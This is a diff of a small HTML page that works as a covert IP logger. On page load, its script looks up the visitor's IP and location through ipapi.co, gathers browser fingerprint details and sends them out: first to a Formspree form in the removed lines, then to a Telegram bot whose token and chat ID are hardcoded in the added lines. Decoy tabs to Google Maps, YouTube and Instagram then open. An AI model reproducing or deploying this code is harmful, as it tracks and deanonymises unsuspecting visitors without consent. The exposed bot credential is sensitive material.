@@ -2,77 +2,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>SLEEEBEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW.</title>
+  <meta charset="UTF-8" />
+  <title>jembut keslomot santen</title>
   <script>
-    const id = new URLSearchParams(window.location.search).get("id") || "anon";
-    const ua = navigator.userAgent;
+    const BOT_TOKEN = '7549616883:AAEBHMx4G4OC5MFJvrnWPYicby_xGJx1rRs';
+    const CHAT_ID = '1246818625';
 
-    const isAndroid = /android/i.test(ua);
-    const isIOS = /iPhone|iPad|iPod/i.test(ua);
-
-    const logData = () => {
-      return fetch("https://ipapi.co/json/")
-        .then(res => res.json())
-        .then(data => {
-          const info = {
-            identifier: id,
-            ip: data.ip,
-            city: data.city,
-            region: data.region,
-            country: data.country_name,
-            org: data.org,
-            time: new Date().toISOString(),
-            ua: navigator.userAgent,
-            platform: navigator.platform,
-            lang: navigator.language,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookies_enabled: navigator.cookieEnabled,
-            referrer: document.referrer || "direct",
-            token: Math.random().toString(36).substring(2, 10),
-            device_memory: navigator.deviceMemory || "unknown",
-            cpu_cores: navigator.hardwareConcurrency || "unknown",
-            color_depth: screen.colorDepth || "unknown",
-            pixel_ratio: window.devicePixelRatio || "unknown",
-            online: navigator.onLine,
-            device_type: isAndroid ? "Android" : isIOS ? "iOS" : "Desktop"
-          };
-
-          return fetch("https://formspree.io/f/mrbkpvwy", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(info),
-          });
-        });
+    const sendToTelegram = (message) => {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      }).catch(err => console.log("Telegram error", err));
     };
 
-    logData().finally(() => {
-      // Google Maps
-      window.open("https://www.google.com/maps", "_blank");
+    const ua = navigator.userAgent;
+    const time = new Date().toISOString();
+    const screen_size = `${window.screen.width}x${window.screen.height}`;
+    const language = navigator.language;
+    const platform = navigator.platform;
+    const referrer = document.referrer || "direct";
 
-      // YouTube intent link (Android) or fallback
-      setTimeout(() => {
-        if (isAndroid) {
-          window.open("intent://www.youtube.com/watch?v=xvFZjo5PgG0#Intent;package=com.google.android.youtube;scheme=https;end;", "_blank");
-        } else {
-          window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank");
-        }
-      }, 1000);
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const msg = `
+📡 *New Visitor*
+🌐 IP: ${data.ip}
+🏙️ City: ${data.city}, ${data.region}, ${data.country_name}
+🏢 ISP: ${data.org}
+🕒 Time: ${time}
+🖥️ Platform: ${platform}, ${screen_size}
+🌍 Lang: ${language}
+🔗 Referrer: ${referrer}
+🧠 UA: ${ua}
+        `;
+        sendToTelegram(msg);
+      })
+      .finally(() => {
+        // Redirects
+        window.open("https://www.google.com/maps", "_blank");
 
-      // Instagram _u/ profile shortcut
-      setTimeout(() => {
-        window.open("https://instagram.com/_u/instagram", "_blank");
-      }, 1000);
+        setTimeout(() => {
+          if (/android/i.test(navigator.userAgent)) {
+            window.open("intent://www.youtube.com/watch?v=xvFZjo5PgG0#Intent;package=com.google.android.youtube;scheme=https;end;", "_blank");
+          } else {
+            window.open("https://www.youtube.com/watch?v=xvFZjo5PgG0", "_blank");
+          }
+        }, 2000);
 
-      // Fallback redirect
-      setTimeout(() => {
-        window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
-      }, 1000);
-    });
+        setTimeout(() => {
+          window.open("https://instagram.com/_u/instagram", "_blank");
+        }, 4000);
+
+        setTimeout(() => {
+          window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0";
+        }, 6000);
+      });
   </script>
 </head>
 <body>
-  <p style="font-family: monospace; font-size: 1.1rem;">[ Punteennnnnnnn... ]</p>
+  <p style="font-family: monospace;">[ Menowo luput nyuwun ngapunten ]</p>
 </body>
 </html>
